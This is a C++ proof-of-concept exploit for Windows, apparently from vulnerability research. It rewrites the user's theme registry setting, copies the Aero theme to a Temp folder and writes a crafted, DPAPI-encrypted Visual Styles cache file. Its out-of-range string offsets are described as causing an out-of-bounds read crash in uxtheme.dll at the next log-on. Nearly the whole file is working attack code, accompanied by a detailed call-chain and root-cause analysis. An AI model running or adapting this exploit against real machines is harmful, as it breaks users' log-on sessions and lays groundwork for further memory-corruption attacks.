#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <windows.h>
#include <wincrypt.h>
#include <wchar.h>
#include <vector>
#include <strsafe.h>
#include <string>
#pragma comment(lib, "Version.lib")
#pragma comment(lib, "Crypt32.lib")

#define STATUS_SUCCESS 0
#define HIDWORD(qw) ((DWORD)((qw) >> 32))
#define LODWORD(qw) ((DWORD)((qw) & 0xFFFFFFFF))

using namespace std;
typedef unsigned long long QWORD, * PQWORD;

typedef NTSTATUS(NTAPI* pRtlCompressBuffer)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, ULONG, PULONG, PVOID);
typedef NTSTATUS(NTAPI* pRtlGetCompressionWorkSpaceSize)(USHORT, PULONG, PULONG);

pRtlCompressBuffer RtlCompressBuffer;
pRtlGetCompressionWorkSpaceSize RtlGetCompressionWorkSpaceSize;

typedef struct _STAGE {
    CHAR Header[32];
    DWORD DATA2_UncompressDataSize;
    DWORD DATA1_UncompressDataSize;
    DWORD DATA2_CompressDataSize;
    DWORD DATA1_CompressDataSize;
} STAGE;

void NtInit() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    RtlCompressBuffer = (pRtlCompressBuffer)GetProcAddress(ntdll, "RtlCompressBuffer");
    RtlGetCompressionWorkSpaceSize = (pRtlGetCompressionWorkSpaceSize)GetProcAddress(ntdll, "RtlGetCompressionWorkSpaceSize");
}

DWORD DeleteAllFiles(LPCWSTR szDir, DWORD recur) {
    HANDLE hSrch; WIN32_FIND_DATA wfd; DWORD res = 1;
    TCHAR DelPath[MAX_PATH], FullPath[MAX_PATH], TempPath[MAX_PATH];
    lstrcpy(DelPath, szDir); lstrcpy(TempPath, szDir);
    if (lstrcmp(DelPath + lstrlen(DelPath) - 4, L"\\*.*") != 0) lstrcat(DelPath, L"\\*.*");
    hSrch = FindFirstFile(DelPath, &wfd);
    if (hSrch == INVALID_HANDLE_VALUE) { if (recur > 0) RemoveDirectory(TempPath); return -1; }
    while (res) {
        wsprintf(FullPath, L"%s\\%s", TempPath, wfd.cFileName);
        if (wfd.dwFileAttributes & FILE_ATTRIBUTE_READONLY) SetFileAttributes(FullPath, FILE_ATTRIBUTE_NORMAL);
        if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (lstrcmp(wfd.cFileName, L".") && lstrcmp(wfd.cFileName, L"..")) { recur++; DeleteAllFiles(FullPath, recur); recur--; }
        }
        else DeleteFile(FullPath);
        res = FindNextFile(hSrch, &wfd);
    }
    FindClose(hSrch); if (recur > 0) RemoveDirectory(TempPath); return 0;
}

void copyAeroDir(const wstring& srcDir, const wstring& destDir) {
    WIN32_FIND_DATAW fd; HANDLE hFind = FindFirstFileW((srcDir + L"\\*").c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        const wstring s = srcDir + L"\\" + fd.cFileName, d = destDir + L"\\" + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (wcscmp(fd.cFileName, L".") && wcscmp(fd.cFileName, L"..") && wcscmp(fd.cFileName, L"Shell") && wcscmp(fd.cFileName, L"VSCache")) {
                CreateDirectoryW(d.c_str(), NULL); copyAeroDir(s, d);
            }
        }
        else if (wcscmp(fd.cFileName, L"aerolite.msstyles")) CopyFileW(s.c_str(), d.c_str(), FALSE);
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
}

DWORD SetAeroDir(PWCHAR aeroPath) {
    HKEY hKey; LPCWSTR tp = L"Software\\Microsoft\\Windows\\CurrentVersion\\ThemeManager";
    LPCWSTR ld = L"%SystemRoot%\\Temp\\Aero\\Aero.msstyles";
    if (RegOpenKeyExW(HKEY_CURRENT_USER, tp, 0, KEY_SET_VALUE, &hKey)) return 0;
    RegSetValueExW(hKey, L"DllName", 0, REG_EXPAND_SZ, (const BYTE*)ld, (wcslen(ld) + 1) * sizeof(WCHAR));
    RegCloseKey(hKey);
    LANGID lang = GetUserDefaultUILanguage(); DWORD dpi = 96;
    HDC dc = GetDC(NULL); if (dc) { dpi = GetDeviceCaps(dc, 88); ReleaseDC(NULL, dc); }
    StringCchPrintfW(aeroPath, MAX_PATH, L"Aero.msstyles_%d_%d_%02x.mss", lang, dpi, 1);
    wstring tmp = L"C:\\Windows\\Temp\\Aero", src = L"C:\\Windows\\Resources\\Themes\\Aero";
    if (GetFileAttributesW(tmp.c_str()) != INVALID_FILE_ATTRIBUTES) DeleteAllFiles(tmp.c_str(), 1);
    CreateDirectoryW(tmp.c_str(), NULL); CreateDirectoryW((tmp + L"\\VSCache").c_str(), NULL);
    copyAeroDir(src, tmp); return 1;
}

ULONG Compress(PBYTE in, ULONG inSize, PBYTE out, ULONG outSize) {
    USHORT fmt = COMPRESSION_ENGINE_MAXIMUM | COMPRESSION_FORMAT_XPRESS_HUFF;
    ULONG wsSize = 0, frag = 0;
    if (RtlGetCompressionWorkSpaceSize(fmt, &wsSize, &frag)) return 0;
    PBYTE ws = new BYTE[wsSize]; ULONG final = 0;
    NTSTATUS s = RtlCompressBuffer(fmt, in, inSize, out, outSize, 0, &final, ws);
    delete[] ws; return s == STATUS_SUCCESS ? final : 0;
}

QWORD GetFileVersion(wstring fp) {
    DWORD d; DWORD sz = GetFileVersionInfoSizeW(fp.c_str(), &d); if (!sz) return 0;
    vector<BYTE> vi(sz); if (!GetFileVersionInfoW(fp.c_str(), 0, sz, vi.data())) return 0;
    VS_FIXEDFILEINFO* fi = nullptr; UINT s = 0;
    if (!VerQueryValueW(vi.data(), L"\\", (LPVOID*)&fi, &s) || !fi) return 0;
    return *(PQWORD)&fi->dwProductVersionMS;
}

/*
 * uxtheme!CThemeServices::ApplyTheme +0x1C/+0x20 offset OOB read
 *
 * Crash module: uxtheme.dll (NOT uxinit.dll)
 * Call chain:
 *   uxinit!LoadCurrentTheme+0xcff          (caller)
 *   -> uxtheme!ApplyThemeSections+0x9       (0x180010cc0, wrapper)
 *   -> uxtheme!CThemeServices::ApplyTheme+0x258  (0x180010cd8)
 *   -> uxtheme!ThemeString                  (0x180012840, returns base+offset, NO bounds check)
 *   -> uxtheme!StringCchCopyW+0x1e          (0x18000ec20, movzx eax,[r8+rcx] -> READ AV)
 *
 * Root cause: uxtheme!ThemeString performs base+offset pointer arithmetic
 *   without validating offset < section_size. StringCchCopyW then dereferences
 *   the resulting wild pointer, and the faulting RIP lands in uxtheme.
 *
 * Offset mapping within ApplyTheme:
 *   ApplyTheme+0x205 -> +0x18 path (theme path string)
 *   ApplyTheme+0x258 -> +0x1C path (color name string) <- current crash
 *   ApplyTheme+0x281 -> +0x20 path (size name string)
 *
 * Attack: Set DATA2 +0x1C and +0x20 to 0x7FFFFFFF.
 *         LoadFromFile only validates +0x14 (size) and +0x18 (strIndex).
 *         ValidateThemeData checks BEGINTHM magic, version, map2 flag,
 *         but does NOT range-check +0x1C/+0x20 string offsets.
 *         On ApplyTheme path: ThemeString(base, 0x7FFFFFFF) -> base+0x7FFFFFFF
 *         -> StringCchCopyW reads unmapped memory -> c0000005 read AV in uxtheme.
 *
 * Trigger: Log off -> log on (theme loaded from malicious VSCache).
 *          uxinit!LoadCurrentTheme calls uxtheme!ApplyThemeSections -> crash.
 */
DWORD CreateMss(PWCHAR mssPath, PBYTE Header) {
    // --- DATA1: normal, safe count ---
    DWORD data1Size = 2048;
    PBYTE data1 = new BYTE[data1Size];
    memset(data1, 0, data1Size);
    wcscpy((PWCHAR)data1, L"poc-f06");
    *(PDWORD)(data1 + 520) = 2;    // count at +0x208
    *(PDWORD)(data1 + 524) = 528;  // DIB offset at +0x20C
    for (DWORD i = 0; i < 2; i++) {
        *(PDWORD)(data1 + 528 + i * 8) = 0xFFFFFFFF;
        *(PDWORD)(data1 + 528 + i * 8 + 4) = 0x00010001;
    }

    ULONG c1sz = data1Size * 4; PBYTE c1 = new BYTE[c1sz];
    ULONG ac1 = Compress(data1, data1Size, c1, c1sz);
    if (!ac1) { wcout << L"[-] Compress DATA1 failed" << endl; return 0; }

    // --- DATA2: theme section with BEGINTHM + malicious offsets ---
    DWORD data2Size = 0x400;
    PBYTE data2 = new BYTE[data2Size];
    memset(data2, 0, data2Size);

    // Theme section header
    *(PULONGLONG)(data2 + 0x00) = 0x4D48544E49474542ULL;  // "BEGINTHM"
    *(PDWORD)(data2 + 0x08) = 0x10008;                     // version

    // LoadFromFile validation fields
    *(PDWORD)(data2 + 0x14) = data2Size;  // size
    *(PDWORD)(data2 + 0x18) = 0x100;      // strIndex -> path string at offset 0x100

    // *** VULNERABILITY TRIGGER ***
    // +0x1C: color name string offset -> OOB (NOT validated by LoadFromFile)
    *(PDWORD)(data2 + 0x1C) = 0x7FFFFFFF;
    // +0x20: size name string offset -> OOB (NOT validated by LoadFromFile)
    *(PDWORD)(data2 + 0x20) = 0x7FFFFFFF;

    wcout << L"[!] DATA2+0x1C (ColorName offset) = 0x7FFFFFFF -> uxtheme!ThemeString returns wild ptr" << endl;
    wcout << L"[!] DATA2+0x20 (SizeName offset)  = 0x7FFFFFFF -> same, crashes at ApplyTheme+0x281" << endl;
    wcout << L"[!] Crash in uxtheme!StringCchCopyW+0x1e: movzx eax,[r8+rcx] on unmapped source" << endl;

    // Language, DPI, plateau fields (for reuse path comparison)
    *(PWORD)(data2 + 0x24) = GetUserDefaultUILanguage();
    DWORD dpi = 96; HDC dc = GetDC(NULL);
    if (dc) { dpi = GetDeviceCaps(dc, 88); ReleaseDC(NULL, dc); }
    *(PDWORD)(data2 + 0x28) = dpi;
    *(PDWORD)(data2 + 0x2C) = 1;

    // Path string at offset 0x100
    wcscpy((PWCHAR)(data2 + 0x100), L"%SystemRoot%\\Temp");

    // ENDTHEME marker
    memcpy(data2 + data2Size - 8, "ENDTHEME", 8);

    ULONG c2sz = data2Size * 4; PBYTE c2 = new BYTE[c2sz];
    ULONG ac2 = Compress(data2, data2Size, c2, c2sz);
    if (!ac2) { wcout << L"[-] Compress DATA2 failed" << endl; return 0; }

    // --- Build STAGE (normal compressed sizes) ---
    DWORD stageSize = sizeof(STAGE) + ac1 + ac2;
    PBYTE stage = new BYTE[stageSize];
    memset(stage, 0, stageSize);
    memcpy(stage, Header, 32);
    ((STAGE*)stage)->DATA2_UncompressDataSize = data2Size;
    ((STAGE*)stage)->DATA1_UncompressDataSize = data1Size;
    ((STAGE*)stage)->DATA2_CompressDataSize = ac2;
    ((STAGE*)stage)->DATA1_CompressDataSize = ac1;
    memcpy(stage + sizeof(STAGE), c1, ac1);
    memcpy(stage + sizeof(STAGE) + ac1, c2, ac2);

    // Encrypt
    DATA_BLOB din = { stageSize, stage }, dout;
    if (!CryptProtectData(&din, L"Visual Styles Cache", 0, 0, 0,
        CRYPTPROTECT_LOCAL_MACHINE | CRYPTPROTECT_UI_FORBIDDEN, &dout)) return 0;

    HANDLE hF = CreateFileW(mssPath, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (hF == INVALID_HANDLE_VALUE) { LocalFree(dout.pbData); return 0; }
    DWORD w; WriteFile(hF, dout.pbData, dout.cbData, &w, 0); CloseHandle(hF);
    wcout << L"[+] MSS written: " << w << L" bytes" << endl;

    LocalFree(dout.pbData);
    delete[] c1; delete[] c2; delete[] stage; delete[] data1; delete[] data2;
    return 1;
}

int main() {
    wcout << L"=== uxtheme!ApplyTheme +0x1C/+0x20 offset OOB read ===" << endl;
    wcout << L"Crash module: uxtheme.dll" << endl;
    wcout << L"Call chain: uxinit!LoadCurrentTheme" << endl;
    wcout << L"  -> uxtheme!ApplyThemeSections (0x180010cc0)" << endl;
    wcout << L"  -> uxtheme!CThemeServices::ApplyTheme (0x180010cd8)" << endl;
    wcout << L"  -> uxtheme!ThemeString (0x180012840) [no bounds check]" << endl;
    wcout << L"  -> uxtheme!StringCchCopyW+0x1e (0x18000ec20) [READ AV]" << endl;
    wcout << L"Trigger offset: +0x1C (ApplyTheme+0x258), +0x20 (ApplyTheme+0x281)" << endl << endl;

    NtInit();
    BYTE header[32] = { 0 };
    QWORD uxVer = GetFileVersion(L"C:\\Windows\\System32\\UXinit.dll");
    QWORD aeroVer = GetFileVersion(L"C:\\Windows\\Resources\\themes\\aero\\Aero.msstyles");
    if (!uxVer || !aeroVer) { wcout << L"[-] Version failed" << endl; return 1; }

    ((PWORD)header)[0] = HIWORD(LODWORD(uxVer));   ((PWORD)header)[1] = LOWORD(LODWORD(uxVer));
    ((PWORD)header)[2] = HIWORD(HIDWORD(uxVer));   ((PWORD)header)[3] = LOWORD(HIDWORD(uxVer));
    ((PWORD)header)[4] = HIWORD(LODWORD(uxVer));   ((PWORD)header)[5] = LOWORD(LODWORD(uxVer));
    ((PWORD)header)[6] = HIWORD(HIDWORD(uxVer));   ((PWORD)header)[7] = LOWORD(HIDWORD(uxVer));
    ((PWORD)header)[8] = HIWORD(LODWORD(aeroVer)); ((PWORD)header)[9] = LOWORD(LODWORD(aeroVer));
    ((PWORD)header)[10] = HIWORD(HIDWORD(aeroVer)); ((PWORD)header)[11] = LOWORD(HIDWORD(aeroVer));
    ((PWORD)header)[12] = HIWORD(LODWORD(aeroVer)); ((PWORD)header)[13] = LOWORD(LODWORD(aeroVer));
    ((PWORD)header)[14] = HIWORD(HIDWORD(aeroVer)); ((PWORD)header)[15] = LOWORD(HIDWORD(aeroVer));

    WCHAR mssPath[MAX_PATH];
    if (!SetAeroDir(mssPath)) return 1;
    wstring full = wstring(L"C:\\Windows\\Temp\\Aero\\VSCache\\") + mssPath;
    if (!CreateMss((PWCHAR)full.c_str(), header)) return 1;

    wcout << endl << L"=== PoC ready ===" << endl;
    wcout << L"1. Log off, log on (theme loads from malicious VSCache)" << endl;
    wcout << L"2. uxinit!LoadCurrentTheme calls uxtheme!ApplyThemeSections" << endl;
    wcout << L"3. Expected: c0000005 READ AV in uxtheme!StringCchCopyW+0x1e" << endl;
    wcout << L"   Stack: StringCchCopyW <- ApplyTheme <- ApplyThemeSections <- LoadCurrentTheme" << endl;
    return 0;
}
